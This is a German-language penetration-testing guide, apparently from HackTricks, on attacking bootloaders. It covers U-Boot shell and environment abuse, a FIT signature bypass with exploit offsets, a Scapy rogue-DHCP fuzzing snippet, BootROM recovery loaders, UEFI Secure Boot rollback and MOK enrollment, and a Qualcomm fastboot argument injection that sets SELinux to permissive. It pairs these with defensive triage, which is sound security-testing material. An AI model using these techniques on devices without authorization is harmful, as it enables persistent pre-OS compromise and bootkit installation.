# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Gerätestartkonfigurationen zu ändern und Bootloader wie U-Boot und UEFI-Klassenloader zu testen. Konzentriere dich darauf, frühzeitig Codeausführung zu erreichen, Signatur- und Rollback-Schutzmaßnahmen zu bewerten und Recovery- oder Netzwerk-Boot-Pfade auszunutzen.

Verwandt: MediaTek-Secure-Boot-Umgehung durch bl2_ext-Patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot-Schnellgewinne und Missbrauch der Umgebung

1. Zugriff auf die Interpreter-Shell
   - Drücke während des Bootvorgangs eine bekannte Unterbrechungstaste (oft eine beliebige Taste, 0, Leertaste oder eine boardspezifische „Magic“-Tastenkombination), bevor `bootcmd` ausgeführt wird, um zur U-Boot-Eingabeaufforderung zu gelangen.<sup>[[1]](#references)</sup>

2. Bootstatus und Variablen untersuchen
   - Nützliche Befehle:
     - `printenv` (Umgebung ausgeben)
     - `bdinfo` (Board-Informationen, Speicheradressen)
     - `help bootm; help booti; help bootz` (unterstützte Kernel-Bootmethoden)
     - `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Bootargumente ändern, um eine Root-Shell zu erhalten
   - `init=/bin/sh` anhängen, damit der Kernel eine Shell statt des normalen Init-Prozesses startet:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot von deinem TFTP-Server
   - Konfiguriere das Netzwerk und rufe ein Kernel-/FIT-Image aus dem LAN ab:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Änderungen über die Umgebung dauerhaft speichern
   - Wenn der env-Speicher nicht schreibgeschützt ist, kannst du die Kontrolle dauerhaft sichern:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, die Fallback-Pfade beeinflussen. Falsch konfigurierte Werte können wiederholten Shell-Zugriff ermöglichen.

6. Debug-/unsichere Funktionen prüfen
   - Achte auf: `bootdelay` > 0, deaktiviertes `autoboot`, uneingeschränktes `usb start; fatload usb 0:1 ...`, Möglichkeit, `loady`/`loads` über die serielle Schnittstelle zu verwenden, `env import` von nicht vertrauenswürdigen Medien sowie Kernel/Ramdisks, die ohne Signaturprüfung geladen werden.

7. U-Boot-Image-/Verifizierungs-Tests
   - Wenn die Plattform Secure Boot/Verified Boot mit FIT-Images beansprucht, teste sowohl unsignierte als auch manipulierte Images:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder ein Legacy-Verhalten mit `verify=n` ermöglicht oft das Booten beliebiger Payloads.
   - Beschränke dich nicht auf ein einfaches Allow/Deny-Ergebnis: Aktuelle FIT-Forschung hat gezeigt, dass der Verifizierungspfad selbst eine Pre-Auth-Angriffsfläche sein kann. Teste extern gespeicherte FIT-Daten (`data-offset`, `data-position`, `data-size`), die Auswahl signierter Konfigurationen, `loadables` sowie die Verarbeitung von Overlays und `extra-conf` mit Negativtests.
   - Wenn du über einen passenden Source Tree verfügst, kannst du mit `test/vboot/vboot_test.sh` das FIT-Verifizierungsverhalten in der U-Boot-Sandbox schnell reproduzieren, bevor du echte Hardware verwendest.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` und Script-Bootflows
   - Bei modernen U-Boot-Builds ist `bootcmd` oft nur ein Wrapper um Standard Boot. Dadurch können beschreibbare Medien, PXE oder SPI-Flash zur eigentlichen Trust Boundary werden, selbst wenn die sichtbare Umgebung harmlos aussieht.
   - Die `extlinux`-Bootmeth sucht nach `extlinux/extlinux.conf` unter `/` und `/boot`; die Script-Bootmeth sucht zuerst nach `boot.scr.uimg` und dann nach `boot.scr`. Beim Netzwerk-Booten kann der Script-Dateiname aus `boot_script_dhcp` stammen.
   - Nützliche Triage-Befehle:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Zu testende Missbrauchsfälle: vom Angreifer kontrollierte USB-/SD-Medien an früherer Stelle in `boot_targets`, beschreibbares `/boot/extlinux/extlinux.conf`, ein Rogue-TFTP-Server, der `boot.scr` bereitstellt, oder skriptgesteuerte Ausführung über SPI mit `script_offset_f`.
   - Wenn die Plattform auf FIT-Verifizierung setzt, stelle sicher, dass Konfigurationen auf Konfigurationsebene signiert sind und nicht nur pro Image; `required-mode=all` ist sicherer als die Akzeptanz eines einzelnen erforderlichen Schlüssels.

### Externe FIT-Daten in SPL vor der Verifizierung kopiert

Beim Laden von FIT in SPL macht eine intakte Konfigurationssignatur die Metadaten externer Payloads nicht sicher. U-Boot schließt `data-position`, `data-offset` und `data-size` von den signierten Konfigurationseigenschaften aus. In betroffenen `load_simple_fit()`-Pfade leitet SPL einen Quelloffset und eine Kopierlänge aus diesen Feldern ab und ruft `info->read()` **vor** der Prüfung des Image-Hashes auf. Ein manipuliertes FIT auf beschreibbaren Boot-Medien kann daher RAM überschreiben, ohne eine Signatur zu fälschen. Die signierte `load`-Eigenschaft legt normalerweise das Ziel fest. Ermittle daher zunächst, ob eine übergroße Kopie von dieser Adresse aus den Stack oder andere Steuerdaten erreichen kann.<sup>[[15]](#references)[[16]](#references)</sup>

Verfolge den tatsächlichen Loader und die Speicherbelegung des Boards, statt einen Flash-Read anzunehmen: Der demonstrierte RAM-Loader erreichte `spl_ram_load_read()` und `memcpy()`. Halte an der Aufrufstelle `fit_offset` und alle vom Reader hinzugefügten FIT-Basisadressen, die Blocklänge des Loaders (`spl_get_bl_len(info)`), eine forkspezifische Ausrichtung, den resultierenden `read_offset` und die Transfer-`size`, das Ziel `src_ptr` sowie die Speicherstelle der gesicherten Rücksprungadresse fest. Prüfe, ob ein zusammenhängender, gemappter Quellbereich die erforderliche Kopierdistanz abdeckt, ob er das Ziel überlappt und ob die Bytes an der Quellposition einen Zeiger auf angreifergesteuerte FIT-Daten liefern können. Die generische [Technik zum partiellen Überschreiben der Rücksprungadresse](../../binary-exploitation/stack-overflow/ret2win/) ist anwendbar, wenn ein vollständiger Zeiger die Ausrichtungsbedingungen des Loaders nicht erfüllen kann.<sup>[[16]](#references)</sup>

Im 32-Bit-Test-Build der Forschenden für AST2600 war `src_ptr` gleich `0x80001000`, und die gesicherte Rücksprungadresse von `memcpy` lag bei `0x902ffe24`. Sie verwendeten einen Upstream-Build, der mit OpenBMCs Stack-Platzierung und Ausrichtungshilfen modifiziert war: Der RAM-Reader addierte eine FIT-Basis von `0x10000`, und diese Hilfsfunktionen rundeten den Quelloffset auf `ARCH_DMA_MINALIGN` (64 Byte) ab. Ein geeigneter Little-Endian-Zeiger bei `0x902fffe4` und eine Kopie, die ein Byte davor endete, änderten nur die unteren drei Bytes der gesicherten Rücksprungadresse und bewahrten das bekannte Null-Byte im höchstwertigen Byte. Der Upstream-RAM-Loader verwendet dagegen eine Blocklänge von einem Byte. Daher sind diese 64-Byte-Ausrichtung und der Workaround mit partiellem Überschreiben keine allgemeinen SPL-Anforderungen. Ermittle Adressen, Blocklänge des Loaders und Kopierumfang für jeden Build erneut. In der ursprünglichen Berechnung unten bezeichnet `fit_offset` die effektive Addition der FIT-Basis durch den RAM-Reader und nicht notwendigerweise das Argument, das an `load_simple_fit()` übergeben wird.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Der Upstream-Fix begrenzt sowohl den rohen Wert `data-size` als auch die **blockausgerichtete** Transfergröße, bevor `info->read()` aufgerufen wird. Sein Overlay-Pfad übergibt die tatsächliche Pufferkapazität, während andere Aufrufer `CONFIG_SYS_BOOTM_LEN` verwenden, was lediglich eine großzügige Obergrenze darstellt und nicht belegt, dass am Ziel so viel freier Speicher vorhanden ist. Prüfe bei der Bewertung eines Vendor-Forks, ob diese Prüfungen vorhanden sind, und vergleiche den zulässigen Kopierbereich mit dem tatsächlichen SPL-Stack und den reservierten Bereichen des Boards.<sup>[[15]](#references)[[16]](#references)</sup>

## Angriffsfläche für Netzwerk-Boot (DHCP/PXE) und Rogue-Server

9. Fuzzing von PXE-/DHCP-Parametern
   - U-Boots veraltete BOOTP-/DHCP-Verarbeitung hatte Probleme mit der Speichersicherheit. CVE‑2024‑42040 beschreibt beispielsweise die Offenlegung von Speicherinhalten durch präparierte DHCP-Antworten, die Bytes aus dem U-Boot-Speicher über das Netzwerk preisgeben können.<sup>[[4]](#references)</sup> Teste die DHCP-/PXE-Codepfade mit überlangen Werten und Randfällen (Option 67 `bootfile-name`, Vendor-Optionen sowie `file`-/`servername`-Felder) und achte auf Hänger oder Leaks.
   - Minimales Scapy-Snippet zum Testen von Boot-Parametern während des Netzwerk-Boots:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Prüfen Sie außerdem, ob PXE-Dateinamenfelder ohne Bereinigung an Shell-/Loader-Logik übergeben werden, wenn sie mit OS-seitigen Provisionierungsskripten verkettet sind.

10. Tests auf command injection über einen Rogue-DHCP-Server
   - Richten Sie einen Rogue-DHCP-/PXE-Dienst ein und versuchen Sie, Zeichen in Datei- oder Optionsfelder einzuschleusen, um in späteren Phasen der Boot-Kette Befehlsinterpreter zu erreichen. Metasploits DHCP-Auxiliary, `dnsmasq` oder benutzerdefinierte Scapy-Skripte eignen sich gut dafür. Isolieren Sie zuvor unbedingt das Labornetzwerk.

## SoC-ROM-Recovery-Modi, die den normalen Bootvorgang umgehen

Viele SoCs bieten einen BootROM-„Loader“-Modus, der Code über USB/UART akzeptiert, selbst wenn Flash-Images ungültig sind. Wenn die Secure-Boot-Fuses nicht gesetzt sind, kann dies bereits sehr früh in der Kette beliebige Codeausführung ermöglichen.

- NXP i.MX (Serial Download Mode)
  - Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
  - Beispiel: `imx-usb-loader u-boot.imx`, um einen angepassten U-Boot aus dem RAM zu laden und auszuführen.
- Allwinner (FEL)
  - Tool: `sunxi-fel`.
  - Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Tool: `rkdeveloptool`.
  - Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, um einen Loader bereitzustellen und einen angepassten U-Boot hochzuladen.

Prüfen Sie, ob die Secure-Boot-eFuses/OTP des Geräts gesetzt sind. Andernfalls umgehen BootROM-Download-Modi häufig jegliche Überprüfung auf höherer Ebene (U-Boot, Kernel, Rootfs), indem sie Ihr First-Stage-Payload direkt aus dem SRAM/DRAM ausführen.

## UEFI-/PC-Bootloader: Schnellprüfungen

11. Tests auf ESP-Manipulation, Rollback und Schlüsselregistrierung
   - Binden Sie die EFI-Systempartition (ESP) ein und suchen Sie nach Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` sowie Pfaden zu Herstellerlogos.
   - Lesen Sie nach Möglichkeit den Secure-Boot-Status und die Schlüsseldatenbanken aus dem Betriebssystem aus:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Wenn sich die Plattform im Setup Mode befindet, eine nicht authentifizierte Schlüsselregistrierung zulässt oder mit einem Test- bzw. Standard-Platform Key ausgeliefert wird (PKfail-Klasse), kann ein lokaler Admin oder ein Angreifer mit physischem Zugriff eigene KEK/db registrieren und Secure Boot weiterhin als „aktiviert“ erscheinen lassen, während beliebige EFI-Binärdateien gebootet werden.<sup>[[3]](#references)</sup>
   - Versuche, mit zurückgestuften oder bekanntermaßen verwundbaren, signierten Boot-Komponenten zu starten, wenn die Secure-Boot-Sperrliste (dbx) nicht aktuell ist. Wenn die Plattform alten Shims/Bootmanagern weiterhin vertraut, kannst du häufig einen eigenen Kernel oder eine `grub.cfg` von der ESP laden, um Persistenz zu erlangen.
   - Unter Windows können gepatchte Hosts weiterhin verwundbare, signierte Bootmanager akzeptieren, wenn der Signierer `Microsoft Windows Production PCA 2011` in der Firmware-`dbx` fehlt, wie bei BlackX beobachtet.<sup>[[13]](#references)[[14]](#references)</sup> Ein Umgehungsverfahren im Stil von Baton Drop kann einen Angreifer-MOK registrieren; anschließend kann ein legitimer Shim bei späteren Starts eine mit diesem Schlüssel signierte EFI-Payload laden.<sup>[[12]](#references)[[13]](#references)</sup> Wird der alte Windows-Signierer später gesperrt, wird der registrierte MOK dadurch nicht entfernt. Der Shim-basierte Pfad kann daher bestehen bleiben, wenn diesem Shim weiterhin vertraut wird.<sup>[[12]](#references)</sup>
   - Bevor du diesen Rollback-Pfad auf einem autorisierten UEFI-Gerät testest, überprüfe den **tatsächlich wirksamen Sperrstatus der Firmware** und nicht nur den Windows-Updateverlauf.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft stellt diese schreibgeschützte PowerShell-Abfrage mit erhöhten Rechten für den Signierer von 2011 in der `dbx` bereit:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` ist lediglich ein Hinweis: Bestätige die konkrete signierte Boot-Komponente und weitere Sperrungen in einer wiederherstellbaren Laborumgebung.<sup>[[12]](#references)[[14]](#references)</sup> Ein ausstehendes Registry-Update oder ein abgelaufenes Signaturzertifikat ist nicht gleichbedeutend mit einer abgeschlossenen `dbx`-Sperrung.<sup>[[13]](#references)[[14]](#references)</sup>

12. Tests auf veraltete shim- und SBAT-Revocations sowie dbx-Sperrungen
   - Alte, von Microsoft signierte shims und Vendor-Forks können bei veralteten Sperrungen weiterhin als BYOVD-artiger Bootkit-Pfad dienen. Lege in einer isolierten Laborumgebung einen historisch anfälligen shim auf der ESP ab und versuche, deine eigene `grubx64.efi` oder deinen eigenen Kernel per Chainloading zu starten.<sup>[[11]](#references)</sup>
   - Schnelle Triage:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Wenn der shim trotz Eintrag in der Sperrliste weiterhin ausgeführt wird, sind die `dbx`-Updates der Firmware/des Betriebssystems veraltet oder es wird einem geforkten Loader vertraut, der die SBAT-Schutzmaßnahmen des Upstream-Projekts nie übernommen hat.

13. Fehler beim Parsen des Boot-Logos (LogoFAIL-Klasse)
   - Mehrere OEM-/IBV-Firmwares waren anfällig für Fehler beim Parsen von Bildern in DXE, die Boot-Logos verarbeiten. Kann ein Angreifer ein manipuliertes Bild unter einem herstellerspezifischen Pfad auf der ESP ablegen (z. B. `\EFI\<vendor>\logo\*.bmp`) und einen Neustart auslösen, ist möglicherweise Codeausführung während des frühen Bootvorgangs möglich, selbst wenn Secure Boot aktiviert ist. Teste, ob die Plattform vom Benutzer bereitgestellte Logos akzeptiert und ob diese Pfade vom Betriebssystem aus beschreibbar sind.<sup>[[2]](#references)</sup>


## Vertrauenslücken bei Android/Qualcomm ABL + GBL (Android 16)

Prüfe auf Android-16-Geräten, die Qualcomm's ABL zum Laden der **Generic Bootloader Library (GBL)** verwenden, ob ABL die UEFI-App **authentifiziert**, die es von der `efisp`-Partition lädt. Prüft ABL lediglich, ob eine UEFI-App **vorhanden** ist, ohne Signaturen zu verifizieren, ermöglicht eine Schreibprimitive für `efisp` die **Ausführung unsignierten Codes vor dem Betriebssystemstart**.<sup>[[6]](#references)[[7]](#references)</sup>

Praktische Prüfungen und Angriffsmöglichkeiten:

- **Schreibprimitive für efisp**: Du benötigst eine Möglichkeit, eine eigene UEFI-App in `efisp` zu schreiben (Root/Zugriff durch einen privilegierten Dienst, Fehler in einer OEM-App, Recovery-/Fastboot-Pfad). Ohne dies ist die GBL-Ladelücke nicht direkt ausnutzbar.<sup>[[6]](#references)</sup>
- **Fastboot-OEM-Argument-Injection** (ABL-Fehler): Einige Builds akzeptieren zusätzliche Tokens in `fastboot oem set-gpu-preemption` und hängen sie an die Kernel-Befehlszeile an. Damit lässt sich SELinux in den permissiven Modus versetzen, wodurch Schreibzugriffe auf geschützte Partitionen möglich werden:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Wenn das Gerät gepatcht ist, sollte der Befehl zusätzliche Argumente zurückweisen.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader-Entsperrung über persistente Flags**: Eine Payload in der Bootphase kann persistente Entsperrungs-Flags (z. B. `is_unlocked=1`, `is_unlocked_critical=1`) setzen und so `fastboot oem unlock` ohne OEM-Server- oder Genehmigungshürden nachahmen. Diese Änderung bleibt auch nach dem nächsten Neustart bestehen.<sup>[[6]](#references)</sup>

Hinweise zur Abwehr/Triage:

- Prüfen Sie, ob ABL Signaturprüfungen für die GBL/UEFI-Payload aus `efisp` durchführt. Falls nicht, behandeln Sie `efisp` als Persistenzfläche mit hohem Risiko.
- Prüfen Sie, ob die fastboot-OEM-Handler von ABL so gepatcht sind, dass sie **die Anzahl der Argumente validieren** und zusätzliche Tokens zurückweisen.<sup>[[8]](#references)[[9]](#references)</sup>

## Vorsicht bei Hardware

Seien Sie beim Zugriff auf SPI/NAND-Flash während der frühen Bootphase vorsichtig (z. B. beim Erden von Pins, um Lesevorgänge zu umgehen) und konsultieren Sie stets das Flash-Datenblatt. Kurzschlüsse zum falschen Zeitpunkt können das Gerät oder den Programmer beschädigen.

## Hinweise und zusätzliche Tipps

- Probieren Sie `env export -t ${loadaddr}` und `env import -t ${loadaddr}` aus, um Umgebungs-Blobs zwischen RAM und Speicher zu verschieben; einige Plattformen erlauben den Import der Umgebung von Wechseldatenträgern ohne Authentifizierung.
- Für Persistenz auf Linux-basierten Systemen, die über `extlinux.conf` booten, reicht es oft, die `APPEND`-Zeile (zum Injizieren von `init=/bin/sh` oder `rd.break`) auf der Bootpartition zu ändern, wenn keine Signaturprüfungen erzwungen werden.
- Wenn das Zielsystem Dual-Slot-/A/B-Updates verwendet, sehen Sie sich die Anti-Rollback- und Slot-Desync-Techniken in der [Übersicht zur Firmware-Analyse](README.md) an, damit Ihnen keine Vertrauenslücken entgehen, die nur den Updater und nicht den Bootloader selbst betreffen.
- Wenn im Userspace `fw_printenv/fw_setenv` verfügbar ist, prüfen Sie, ob `/etc/fw_env.config` dem tatsächlichen Speicherort der Umgebung entspricht. Falsch konfigurierte Offsets ermöglichen das Lesen/Schreiben der falschen MTD-Region.

## References

- [1] [Methodik zum Testen der Firmware-Sicherheit](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL aufgedeckt: Die Gefahren der Bildverarbeitung während des Systemstarts](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Nicht vertrauenswürdige Plattformschlüssel untergraben Secure Boot im UEFI-Ökosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Details zu CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Zuvorgekommen: Xiaomi durch zwei nicht bereinigte Zeichenfolgen entsperren](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit für Qualcomm Snapdragon 8 Elite GBL ermöglicht Angreifern, Bootloader zu entsperren](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architektur des Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Weitergabe nicht vertrauenswürdiger Eingaben an die Kernel-Befehlszeile beheben](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Prüfung für den Befehl set-hw-fence-value hinzufügen](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Nicht bootfähig: U-Boots FIT-Signaturprüfung aushebeln](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Schwachstellenhinweis VU#616257 – Microsoft-signierte UEFI-shim-Bootloader sind anfällig für Secure-Boot-Umgehungen](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus-UEFI-Bootkit: Mythos bestätigt](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: ein BlackLotus-ähnliches UEFI-Bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Verwalten von Sperrungen des Windows Boot Manager bei Secure-Boot-Änderungen](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [U-Boot-Patch: Größe der externen Daten vor dem Lesen begrenzen](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Versteckte Vorteile: Signaturprüfung in U-Boot SPL umgehen](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
